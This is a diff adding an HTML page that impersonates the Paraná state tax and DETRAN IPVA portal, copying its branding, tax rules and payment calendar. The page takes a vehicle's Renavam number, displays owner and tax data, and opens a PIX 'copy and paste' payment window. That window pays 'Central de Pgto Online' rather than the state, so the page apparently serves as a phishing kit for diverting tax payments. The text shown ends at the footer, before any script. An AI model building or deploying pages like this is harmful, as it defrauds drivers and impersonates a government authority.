@@ -1,0 +1,1110 @@
+<!DOCTYPE html>
+<html class="" style="--base-size: 10.506240527343751px; --viewport-height: 730px; --min-viewport-height: 729.6000366210938px;">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>DETRAN PR | Site Oficial</title>
+    
+    <link href="./Logo-Parana.png" rel="icon" type="image/png">
+    <link href="./all.min.css" rel="stylesheet">
+    <link href="./index(1).css" rel="stylesheet">
+
+    <style id="static-css">html:has(body.editing)::-webkit-scrollbar{display:none !important}body.editing::-webkit-scrollbar{display:none !important}html:has(body.editing){-ms-overflow-style:none;scrollbar-width:none}body.editing{-ms-overflow-style:none;scrollbar-width:none}body{--baseColor-accent: #FF0000;--baseColor-accent-rgb: 255, 0, 0;--baseColor-accent-reverse-rgb: 255, 255, 255}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:focus{outline:0}html,body{min-height:var(--viewport-height, 100vh);margin:0;padding:0}html{--mobile-scale: 1;font-size:var(--base-size);touch-action:manipulation;position:relative}body{-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-webkit-text-size-adjust:none;display:flex;flex-direction:column;width:100%;min-height:var(--viewport-height, 100vh);justify-content:flex-start;margin:0;padding:0;background-color:#c9c9c9}customhtml>*{position:relative;z-index:10}.content{display:flex;flex-direction:column;align-items:flex-start;justify-content:flex-start;min-height:100%;position:relative;flex-grow:1;border-color:transparent;border-width:0}.pages{width:100%;flex:1 0 auto}</style>
+    
+    <style>
+        html { --mobile-scale: 1.4; --mobile-padding-offset: 0.6; }
+        bodycopy { font-size: 1.2rem; font-weight: 500; color: rgba(0, 0, 0, 0.75); font-family: "Diatype Variable", sans-serif; font-style: normal; line-height: 1.2; letter-spacing: 0em; display: block; }
+        .page-content { padding: 0rem; text-align: center; }
+        
+        /* === SISTEMA DETRAN === */
+        .sistema-container {
+            background-color: #fff;
+            width: 100%;
+            min-height: 100vh;
+            text-align: left;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .hidden { display: none !important; }
+        .row { display: flex; flex-wrap: wrap; margin-top: 20px; }
+        
+        /* Cabeçalho */
+        .header-container { width: 100%; border-bottom: 1px solid #ccc; height: 96px; background: #fff; }
+        .header-content { max-width: 1200px; margin: 0 auto; height: 100%; position: relative; display: flex; align-items: center; padding: 0 20px; justify-content: space-between; }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .header-texts { font-family: Arial; color: #333; }
+        .header-texts .line1 { font-size: 14px; font-weight: bold; }
+        .header-texts .line2 { font-size: 16px; font-weight: bold; }
+        .header-right { display: flex; align-items: center; gap: 20px; }
+        .btn-acessar { display: flex; align-items: center; text-decoration: none; color: #333; border: 1px solid #ccc; padding: 8px 15px; border-radius: 4px; font-size: 14px; font-weight: bold; }
+        
+        /* Corpo */
+        .main-container { max-width: 1200px; margin: 20px auto; padding: 0 20px; }
+        
+        .page-title-row { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px; }
+        .page-title { font-size: 24px; font-weight: bold; color: #005a9c; }
+        
+        /* Abas */
+        .nav-tabs { display: flex; border-bottom: 1px solid #ddd; background-color: #f7f7f7; padding-left: 10px; overflow-x: auto; }
+        .nav-item { padding: 10px 15px; cursor: pointer; color: #005a9c; font-weight: bold; font-size: 13px; text-decoration: none; border-right: 1px solid #ddd; display: block; white-space: nowrap; }
+        .nav-item:hover { background-color: #e6e6e6; }
+        .nav-item.active { background-color: #fff; color: #333; cursor: default; border-bottom: 2px solid #fff; }
+
+        /* Colunas */
+        .col-text { width: 60%; padding-right: 40px; box-sizing: border-box; font-size: 14px; line-height: 1.5; color: #333; }
+        .col-form { width: 40%; box-sizing: border-box; }
+
+        /* Estilos Texto */
+        .h-section { font-size: 18px; font-weight: bold; color: #000; margin-bottom: 15px; display: block; }
+        .p-text { margin-bottom: 12px; text-align: justify; }
+        .h-blue { color: #005a9c; font-weight: bold; margin-top: 20px; display: block; margin-bottom: 8px; font-size: 16px; }
+        .list-group { list-style: none; padding: 0; margin: 0; }
+        .list-item { margin-bottom: 10px; padding-left: 20px; position: relative; }
+        .list-icon { position: absolute; left: 0; top: 5px; }
+        
+        /* Busca */
+        .search-box { border: 1px solid #005a9c; padding: 20px; margin-bottom: 20px; background: #fff; }
+        .search-title { color: #005a9c; font-size: 18px; font-weight: bold; display: block; margin-bottom: 15px; }
+        .input-label { font-weight: bold; font-size: 13px; display: block; margin-bottom: 5px; }
+        .input-field { width: 100%; padding: 8px; border: 1px solid #ccc; font-size: 14px; box-sizing: border-box; }
+        .btn-consultar { background: #005a9c; color: #fff; display: block; text-align: center; padding: 10px; font-weight: bold; text-decoration: none; border-radius: 2px; cursor: pointer; margin-top: 15px; }
+        .btn-consultar:hover { background: #004b8d; }
+        
+        /* Calendário */
+        .calendar-container { background: #f9f9f9; border: 1px solid #f1f1f1; padding: 15px; font-family: Arial, sans-serif; }
+        .cal-title { font-size: 18px; font-weight: bold; color: #005a9c; display: block; }
+        .cal-sub { font-size: 11px; color: #666; margin-bottom: 10px; display: block; margin-top: 5px; }
+        .cal-table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; }
+        .cal-table th { background: #f5f5f5; border: 1px solid #ddd; padding: 5px; text-align: center; color: #333; }
+        .cal-table td { border: 1px solid #ddd; padding: 5px; text-align: center; color: #333; }
+
+        /* TELA DE RESULTADOS */
+        .banner-azul { background-color: #005a9c; color: #fff; padding: 15px; border-radius: 4px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .banner-text h2 { font-size: 18px; font-weight: bold; margin: 0 0 5px 0; color: #fff; }
+        .banner-text p { font-size: 13px; margin: 0; color: #fff; }
+        
+        .result-box { border: 1px solid #e1e1e1; background: #fff; padding: 15px; border-radius: 4px; margin-bottom: 20px; margin-top: 20px; }
+        .result-title { font-size: 18px; font-weight: bold; color: #005a9c; display: block; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        
+        .veiculo-grid { width: 100%; border-collapse: collapse; }
+        .veiculo-grid td { padding: 8px; vertical-align: top; }
+        .label-gray { font-size: 12px; color: #666; font-weight: bold; display: block; text-transform: uppercase; }
+        .value-black { font-size: 14px; color: #000; font-weight: bold; display: block; margin-top: 4px; }
+        .text-green { color: #008000; font-weight: bold; }
+        
+        .BTNPIX { border: 0; background-color: #32BCAD; color: #fff; font-weight: bold; display: inline-flex; gap: 6px; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s all; border-radius: 4px; padding: 6px 12px; font-size: 12px; text-transform: uppercase; }
+        .BTNPIX svg { width: 16px; height: 16px; fill: #fff; }
+
+        /* Informações ao Contribuinte */
+        .info-box { background-color: #f9f9f9; padding: 15px; border: 1px solid #ddd; margin-top: 20px; font-size: 12px; color: #333; }
+        .info-box h4 { color: #005a9c; margin: 0 0 10px 0; font-size: 14px; }
+        .info-list { list-style: decimal; padding-left: 20px; margin: 0; }
+        .info-list li { margin-bottom: 5px; text-align: justify; }
+
+        .footer { text-align: center; padding: 10px; border-top: 1px solid #ccc; margin-top: 40px; color: #666; font-size: 12px; }
+
+        /* ========================================= */
+        /* NOVO MODAL PIX PERSONALIZADO */
+        /* ========================================= */
+        .modal-pix-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-pix-content {
+            background-color: white;
+            width: 90%;
+            max-width: 450px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            max-height: 85vh;
+        }
+        
+        .modal-pix-header {
+            background-color: #005a9c;
+            color: white;
+            padding: 15px 20px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        
+        .modal-pix-header img {
+            height: 40px;
+            margin-bottom: 10px;
+        }
+        
+        .modal-pix-header .estado {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 2px;
+        }
+        
+        .modal-pix-header .secretaria {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+        
+        .modal-pix-body {
+            padding: 20px;
+            text-align: center;
+            overflow-y: auto;
+            flex-grow: 1;
+        }
+        
+        .modal-pix-aguardando {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 20px;
+            margin-top: 10px;
+        }
+        
+        .modal-pix-qrcode {
+            width: 220px;
+            height: 220px;
+            margin: 0 auto 20px;
+            background-color: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #666;
+            font-size: 14px;
+            position: relative;
+        }
+        
+        .modal-pix-expira {
+            margin-bottom: 25px;
+        }
+        
+        .modal-pix-timer {
+            font-size: 24px;
+            font-weight: bold;
+            color: #d9534f;
+            margin: 10px 0;
+            font-family: monospace;
+        }
+        
+        .modal-pix-info {
+            text-align: center;
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 20px;
+            font-size: 14px;
+            border-left: 4px solid #005a9c;
+        }
+        
+        .modal-pix-info .descricao {
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        
+        .modal-pix-info .valor {
+            font-size: 20px;
+            font-weight: bold;
+            color: #2e7d32;
+            margin: 8px 0;
+        }
+        
+        .modal-pix-info .data {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        /* Código PIX Completo */
+        .modal-pix-codigo-container {
+            margin-top: 25px;
+            text-align: left;
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid #e9ecef;
+        }
+        
+        .modal-pix-codigo-label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #005a9c;
+            font-size: 15px;
+            text-align: center;
+        }
+        
+        .modal-pix-codigo {
+            background-color: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 13px;
+            word-break: break-all;
+            color: #333;
+            line-height: 1.5;
+            max-height: 120px;
+            overflow-y: auto;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        
+        /* BOTÃO COPIAR CÓDIGO PIX */
+        .btn-copiar-pix-modal {
+            background-color: #32BCAD;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            width: 100%;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-copiar-pix-modal:hover {
+            background-color: #2aa99b;
+        }
+        
+        .btn-copiar-pix-modal.copiado {
+            background-color: #2e7d32;
+        }
+        
+        .btn-copiar-pix-modal svg {
+            width: 16px;
+            height: 16px;
+            fill: white;
+        }
+        
+        /* Como pagar no PIX */
+        .como-pagar-pix {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: #f0f7ff;
+            border-radius: 8px;
+            border: 1px solid #d1e7ff;
+            text-align: left;
+        }
+        
+        .titulo-pagamento {
+            font-weight: bold;
+            color: #005a9c;
+            margin-bottom: 12px;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .passos-pix {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .passo {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        
+        .emoji-passo {
+            font-size: 16px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        
+        .texto-passo {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.4;
+        }
+        
+        .info-recebedor {
+            margin-top: 20px;
+            padding: 12px;
+            background-color: #fff;
+            border-radius: 6px;
+            border: 1px solid #e9ecef;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+        
+        .btn-fechar-pix {
+            background-color: #6c757d;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            width: 100%;
+            margin-top: 20px;
+            flex-shrink: 0;
+        }
+        
+        .btn-fechar-pix:hover {
+            background-color: #5a6268;
+        }
+
+        /* ========================================= */
+        /* PROTEÇÃO CONTRA INSPEÇÃO - REMOVIDA */
+        /* ========================================= */
+        .no-select {
+            user-select: text !important;
+            -webkit-user-select: text !important;
+            -moz-user-select: text !important;
+            -ms-user-select: text !important;
+        }
+        
+        .no-context-menu {
+            -webkit-touch-callout: default;
+            -webkit-user-select: text;
+            -khtml-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+
+        /* ========================================= */
+        /* RESPONSIVIDADE (MOBILE AJUSTADO) */
+        /* ========================================= */
+        @media screen and (max-width:768px) {
+            .header-container { height: auto; padding: 15px 0; }
+            .header-content { flex-direction: column; gap: 15px; padding: 0 15px; }
+            .header-left { flex-direction: column; text-align: center; gap: 10px; }
+            .header-right { width: 100%; justify-content: center; }
+            .header-right a:first-child { display: none; } 
+            
+            /* ORDEM INVERTIDA NO MOBILE: BUSCA EM CIMA */
+            .row { flex-direction: column; }
+            .col-form { width: 100%; padding: 0; order: 1; }
+            .col-text { width: 100%; padding: 0; order: 2; margin-top: 30px; }
+            
+            .veiculo-grid td { display: block; width: 100%; padding-left: 0; }
+            .page-title { font-size: 20px; }
+            .assistente-img { display: none; }
+            .banner-azul { flex-direction: column; text-align: center; gap: 10px; }
+            
+            /* Modal responsivo */
+            .modal-pix-content {
+                width: 95%;
+                max-width: 380px;
+                max-height: 90vh;
+            }
+            
+            .modal-pix-qrcode {
+                width: 200px;
+                height: 200px;
+            }
+            
+            .modal-pix-codigo {
+                font-size: 12px;
+                max-height: 100px;
+            }
+            
+            .texto-passo {
+                font-size: 13px;
+            }
+        }
+    </style>
+    <script src="./jquery-3.6.0.min.js.download"></script>
+</head>
+
+<body class="f-f home">
+    <!-- MODAL PIX PERSONALIZADO (OCULTO INICIALMENTE) -->
+    <div id="modalPix" class="modal-pix-overlay">
+        <div class="modal-pix-content">
+            <div class="modal-pix-header">
+                <img src="./Logo-Parana.png" style="height: 40px; margin-bottom: 10px;">
+                <div class="estado">Estado do Paraná</div>
+                <div class="secretaria">Secretaria de Estado da Fazenda</div>
+            </div>
+            
+            <div class="modal-pix-body">
+                <div class="modal-pix-aguardando">Aguardando Pagamento</div>
+                
+                <div class="modal-pix-qrcode" id="qrcodePlaceholder">
+                    <!-- QR Code será gerado aqui via backend -->
+                    Carregando QR Code...
+                </div>
+                
+                <div class="modal-pix-expira">
+                    Este QR Code expira em:
+                    <div class="modal-pix-timer" id="pixTimer">14 : 52</div>
+                </div>
+                
+                <div class="modal-pix-info">
+                    <div class="descricao">Descrição Pagamento IPVA 2026</div>
+                    <div class="valor" id="pixValor">R$ 189,41</div>
+                    <div class="data">Data de Pagamento: <span id="pixData">02/05/2026</span></div>
+                </div>
+                
+                <!-- CÓDIGO PIX COMPLETO -->
+                <div class="modal-pix-codigo-container">
+                    <div class="modal-pix-codigo-label">Código PIX (Copia e Cola):</div>
+                    <div class="modal-pix-codigo" id="pixCodigo">
+                        Carregando código PIX...
+                    </div>
+                    <button class="btn-copiar-pix-modal" onclick="copiarCodigoPixModal()" id="btnCopiarPix">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+                            <path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/>
+                            <path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/>
+                        </svg>
+                        COPIAR CÓDIGO PIX
+                    </button>
+                </div>
+                
+                <!-- COMO PAGAR NO PIX (ATUALIZADO) -->
+                <div class="como-pagar-pix">
+                    <div class="titulo-pagamento">
+                        <span>1️⃣</span> Como pagar com PIX
+                    </div>
+                    <div class="passos-pix">
+                        <div class="passo">
+                            <div class="emoji-passo">•</div>
+                            <div class="texto-passo">Abra o aplicativo do seu banco, escolha a opção PIX e escaneie o QR Code acima.</div>
+                        </div>
+                        <div class="passo">
+                            <div class="emoji-passo">•</div>
+                            <div class="texto-passo">Ou copie o código PIX, abra o aplicativo do seu banco, escolha a opção PIX > Copia e Cola e cole o código.</div>
+                        </div>
+                        <div class="passo">
+                            <div class="emoji-passo">•</div>
+                            <div class="texto-passo">Confirme as informações e finalize o pagamento.</div>
+                        </div>
+                        <div class="passo">
+                            <div class="emoji-passo">•</div>
+                            <div class="texto-passo">Após o pagamento, você será redirecionado automaticamente para a página de confirmação.</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- INFORMAÇÕES DO RECEBEDOR -->
+                <div class="info-recebedor">
+                    Recebedor: Central de Pgto Online - CNPJ: 69.941.678/0001-99
+                </div>
+                
+                <button class="btn-fechar-pix" onclick="fecharModalPix()">Fechar</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="content">
+        <div style="margin-top: 0px; margin-bottom: 0px;" class="pages">
+            <div id="L2400837117" page-url="project-01" class="page" style="--pin-padding-top: 0px; --pin-padding-bottom: 0px;">
+                <div class="page-layout">
+                    <div class="page-content">
+                        <bodycopy style="--fit-height: 730px; --resize-parent-width: 1520.796875px;">
+                            <div style="margin: -10px;">
+                                
+                                <div class="sistema-container">
+                                    
+                                    <div class="header-container">
+                                        <div class="header-content">
+                                            <div class="header-left">
+                                                <img src="./Logo-Parana.png" style="height: 60px;">
+                                                <div class="header-texts">
+                                                    <div class="line1">Estado do Paraná</div>
+                                                    <div class="line2">Secretaria de Estado da Fazenda</div>
+                                                </div>
+                                            </div>
+                                            <div class="header-right">
+                                                <a href="#" style="text-decoration: none; color: #005a9c; font-weight: bold; margin-right: 20px; font-size: 14px;">Ir para o Portal da Fazenda</a>
+                                                <a href="#" class="btn-acessar"><img src="./entrar.png" style="height: 16px; margin-right: 8px;"> Acessar o sistema</a>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="main-container">
+                                        
+                                        <div class="page-title-row">
+                                            <span class="page-title">IPVA - Imposto sobre a Propriedade de Veículos Automotores</span>
+                                            <img src="./assistente-virtual.png" class="assistente-img" style="height: 60px;">
+                                        </div>
+
+                                        <div id="tela-pesquisa">
+                                            
+                                            <div class="nav-tabs">
+                                                <div class="nav-item active">Sobre o IPVA</div>
+                                                <div class="nav-item">Consultas</div>
+                                                <div class="nav-item">Serviços</div>
+                                                <div class="nav-item">Legislação</div>
+                                                <div class="nav-item">Ajuda</div>
+                                            </div>
+
+                                            <div class="row">
+                                                <div class="col-text">
+                                                    <span class="h-section">Sobre o IPVA</span>
+                                                    <p class="p-text">Trata-se de imposto estadual lançado anualmente, que destina 50% para o município de emplacamento do veículo. Sua arrecadação é utilizada para custear os gastos públicos, como educação, saúde, segurança e transporte.</p>
+                                                    <p class="p-text">Para veículos adquiridos em anos anteriores, a cobrança do imposto se inicia em janeiro e a alíquota é de 3,5% ou 1% do valor do veículo, podendo ser quitado à vista (com bonificação de 10%) ou em até cinco parcelas.</p>
+                                                    <p class="p-text">Se estiverem vencidos, os débitos do ano corrente devem ser quitados em uma única cota. Os débitos vencidos de anos anteriores podem ser parcelados.</p>
+
+                                                    <span class="h-blue">Como pagar o IPVA:</span>
+                                                    <div class="list-group">
+                                                        <div class="list-item"><img src="./icon_mark.png" class="list-icon"> As guias para pagamento estão disponíveis em <b>"Consultar Débitos e Guias para pagar o IPVA/PR"</b>, acessado com o número do <b>Renavam</b>;</div>
+                                                        <div class="list-item"><img src="./icon_mark.png" class="list-icon"> <b>O IPVA pode ser pago por meio de:</b></div>
+                                                        <div class="list-item" style="padding-left: 20px;"><img src="./icon_mark.png" class="list-icon" style="left:20px;"> GR-PR (Guia de Recolhimento do Estado do Paraná) nos bancos credenciados (Banco do Brasil, Bradesco, Bancoob, Rendimento, Santander, Itaú e Sicredi) para quaisquer exercícios pendentes de IPVA;</div>
+                                                        <div class="list-item" style="padding-left: 20px;"><img src="./icon_mark.png" class="list-icon" style="left:20px;"> Apenas com o nº de Renavam do veículo, nas agências ou nos caixas automáticos dos bancos credenciados (com exceção do Banco do Brasil).</div>
+                                                        <div class="list-item" style="padding-left: 20px;"><img src="./icon_mark.png" class="list-icon" style="left:20px;"> Pagamento via PIX, por meio de QR-CODE em GR-PR disponível no portal público.</div>
+                                                        <div class="list-item" style="padding-left: 20px;"><img src="./icon_mark.png" class="list-icon" style="left:20px;"> Consulta ao aplicativo Receita Paraná para pagamento via PIX, GR-PR e cartão de crédito - download do aplicativo <b>(IOS)</b> e <b>(Android)</b></div>
+                                                        <div class="list-item" style="padding-left: 20px;"><img src="./icon_mark.png" class="list-icon" style="left:20px;"> Por meio de cartão de crédito para o exercício de 2025, em até 12 parcelas, por meio de empresas terceirizadas <b>(mais informações)</b></div>
+                                                    </div>
+
+                                                    <span class="h-blue">Observações:</span>
+                                                    <div class="list-group">
+                                                        <div class="list-item"><img src="./icon_mark.png" class="list-icon"> As dívidas ativas desvinculadas do veículo (oriundas de aquisições em leilão ou determinações judiciais) podem ser quitadas com a emissão de guia para pagamento do IPVA;</div>
+                                                        <div class="list-item"><img src="./icon_mark.png" class="list-icon"> Prazo de compensação: <b style="color:red">até um dia útil após o pagamento.</b></div>
+                                                    </div>
+
+                                                    <span class="h-blue">Como parcelar o IPVA:</span>
+                                                    <div class="list-group">
+                                                        <div class="list-item"><img src="./icon_mark.png" class="list-icon"> Consultar Débitos e Guias para pagar o IPVA/PR com o número do Renavam ou Acessar o Menu Serviços Parcelamento de IPVA;</div>
+                                                        <div class="list-item"><img src="./icon_mark.png" class="list-icon"> É possível parcelar os débitos de IPVA de exercícios anteriores ao atual;</div>
+                                                        <div class="list-item"><img src="./icon_mark.png" class="list-icon"> O parcelamento pode chegar a até 10 parcelas, respeitado o valor mínimo da parcela de 1 UPF. Caso haja ajuizamento ou protesto de dívidas ativas, será necessário procurar a PGE para pagamento de custas e honorários;</div>
+                                                        <div class="list-item"><img src="./icon_mark.png" class="list-icon"> O pagamento das parcelas deverá ser feito nos bancos credenciados, com emissão de cada parcela em seu mês de referência;</div>
+                                                        <div class="list-item"><img src="./icon_mark.png" class="list-icon"> Quem pode parcelar: proprietário, comprador do veículo registrado no Detran/PR ou arrendatário de veículo.</div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="col-form">
+                                                    <div class="search-box">
+                                                        <span class="search-title">Consultar Débitos e Guias para pagar o IPVA/PR</span>
+                                                        <div style="margin-top: 15px;">
+                                                            <label class="input-label" for="RENAVAM">* Renavam</label>
+                                                            <input type="text" id="RENAVAM" class="input-field" placeholder="Digite o Renavam" maxlength="11">
+                                                        </div>
+                                                        <a class="btn-consultar" onclick="consultarEResolver()">CONSULTAR</a>
+                                                    </div>
+
+                                                    <div class="calendar-container">
+                                                        <span class="cal-title">Calendário de vencimento IPVA 2025</span>
+                                                        <span class="cal-sub">Resolução SEFA nº 1441/2024, publicada em DOE nº 11801 de 05/12/2024.</span>
+                                                        <p style="font-size:12px; margin-top:10px; color:#005a9c; font-weight:bold;">Prazo de Pagamento IPVA 2025<br><span style="color:#333; font-weight:normal;">Janeiro de 2025 - À vista (com bonificação de 6%)</span></p>
+                                                        <table class="cal-table">
+                                                            <tr><th>PLACAS COM FINAL</th><th>PRAZO DE PAGAMENTO</th></tr>
+                                                            <tr><td>1 e 2</td><td>24/01/2025</td></tr>
+                                                            <tr><td>3 e 4</td><td>27/01/2025</td></tr>
+                                                            <tr><td>5 e 6</td><td>28/01/2025</td></tr>
+                                                            <tr><td>7 e 8</td><td>29/01/2025</td></tr>
+                                                            <tr><td>9 e 0</td><td>30/01/2025</td></tr>
+                                                        </table>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div id="tela-resultados" class="hidden">
+                                            
+                                            <div style="background-color:#fff3cd; color:#856404; padding:15px; border:1px solid #ffeeba; border-radius:4px; margin-bottom:20px;">
+                                                <strong style="display:flex; align-items:center; gap:5px;"><svg style="width:16px;" viewBox="0 0 16 16"><path fill="#856404" d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/></svg> ATENÇÃO</strong>
+                                                <p style="margin:5px 0 0 0; font-size:13px;">Os débitos pendentes de exercícios anteriores ao corrente são passíveis de inscrição em dívida ativa conforme previsto na Lei 14.260/03, Art. 11-A.</p>
+                                            </div>
+
+                                            <div class="banner-azul">
+                                                <div class="banner-text">
+                                                    <h2>Seu IPVA ficou mais leve!</h2>
+                                                    <p>Pague à vista e ganhe 10% de desconto, ou parcele em até 5 cotas.</p>
+                                                </div>
+                                            </div>
+
+                                            <div class="result-box">
+                                                <span class="result-title">Dados do Veículo no Detran/PR</span>
+                                                <table class="veiculo-grid">
+                                                    <tr>
+                                                        <td colspan="4"><span class="label-gray">Proprietário</span><span class="value-black" id="res-proprietario">...</span></td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td width="25%"><span class="label-gray">Renavam</span><span class="value-black" id="res-renavam">...</span></td>
+                                                        <td width="25%"><span class="label-gray">Placa</span><span class="value-black" id="res-placa">...</span></td>
+                                                        <td width="25%"><span class="label-gray">Marca/Modelo</span><span class="value-black" id="res-modelo">...</span></td>
+                                                        <td width="25%"><span class="label-gray">Ano Fabricação</span><span class="value-black" id="res-ano">...</span></td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td><span class="label-gray">Tipo/Espécie</span><span class="value-black">AUTOMOVEL / PASSAGEIRO</span></td>
+                                                        <td><span class="label-gray">Combustível</span><span class="value-black">ALCOOL/GASOLINA</span></td>
+                                                        <td><span class="label-gray">Situação</span><span class="value-black" id="res-status">...</span></td>
+                                                        <td><span class="label-gray">Categoria</span><span class="value-black">PARTICULAR</span></td>
+                                                    </tr>
+                                                </table>
+                                            </div>
+
+                                            <div class="result-box">
+                                                <span class="result-title">IPVA 2026 - Pagamento em Cota Única (10% Desconto)</span>
+                                                <table class="cal-table">
+                                                    <thead>
+                                                        <tr>
+                                                            <th>Exercício</th><th>Vencimento</th><th>IPVA</th><th>Multa</th><th>Desconto</th><th>Juros</th><th>Total a Pagar</th><th>Ação</th>
+                                                        </tr>
+                                                    </thead>
+                                                    <tbody id="tabela-cota-unica"></tbody>
+                                                </table>
+                                            </div>
+
+                                            <div class="result-box">
+                                                <span class="result-title">IPVA 2026 - Pagamento Parcelado em Cotas</span>
+                                                <table class="cal-table">
+                                                    <thead>
+                                                        <tr>
+                                                            <th>Exercício</th><th>Vencimento</th><th>Cota</th><th>IPVA</th><th>Multa</th><th>Juros</th><th>Total a Pagar</th><th>Ação</th>
+                                                        </tr>
+                                                    </thead>
+                                                    <tbody id="tabela-parcelado"></tbody>
+                                                </table>
+                                            </div>
+                                            
+                                            <div class="result-box">
+                                                <span class="result-title">IPVA de Exercícios Anteriores</span>
+                                                <table class="cal-table">
+                                                    <thead>
+                                                        <tr><th>Exercício</th><th>Vencimento</th><th>IPVA</th><th>Multa</th><th>Juros</th><th>Total a Pagar</th><th>Ação</th></tr>
+                                                    </thead>
+                                                    <tbody id="tabela-anterior"><tr><td colspan="7">Nada consta</td></tr></tbody>
+                                                </table>
+                                            </div>
+
+                                            <div class="result-box">
+                                                <span class="result-title">IPVA Inscrito em Dívida Ativa</span>
+                                                <div style="padding: 20px; text-align: center; background: #fdfdfd;">
+                                                    <span style="font-weight:bold; color:#005a9c;">PARCELAMENTO DE DÍVIDA ATIVA: Clique aqui para consultar/efetuar/emitir GR-PR</span>
+                                                </div>
+                                            </div>
+
+                                            <div class="info-box">
+                                                <h4>Informações ao contribuinte</h4>
+                                                <ol class="info-list">
+                                                    <li>Os valores apresentados estão calculados para pagamento até <b>30/01/2026</b>. Débitos inscritos em dívida ativa estão com os benefícios da Lei Estadual nº 22.764/2025.</li>
+                                                    <li>Os débitos acima referem-se, exclusivamente, ao IPVA/PR. Taxas de licenciamento, seguro obrigatório e demais débitos relativos aos órgãos de trânsito devem ser obtidos junto ao <a href="#">Detran/PR</a>.</li>
+                                                    <li>Os créditos do Programa Nota PR, caso utilizados, já estão considerados nos valores de IPVA pendente apresentados acima.</li>
+                                                    <li><b>Bancos credenciados:</b> Banco do Brasil, Bancoob, Bradesco, Itaú, Rendimento, Santander ou Sicredi. <a href="#">www.fazenda.pr.gov.br</a></li>
+                                                    <li>O(s) pagamento(s) será(ão) apropriado(s) automaticamente de forma sucessiva para a primeira parcela ou cota pendente.</li>
+                                                </ol>
+                                            </div>
+
+                                            <div style="text-align: center; margin-top: 20px;">
+                                                <a href="#" onclick="location.reload();" style="color: #666; text-decoration: underline;">Nova Consulta</a>
+                                            </div>
+                                        </div>
+
+                                    </div>
+
+                                    <div class="footer">
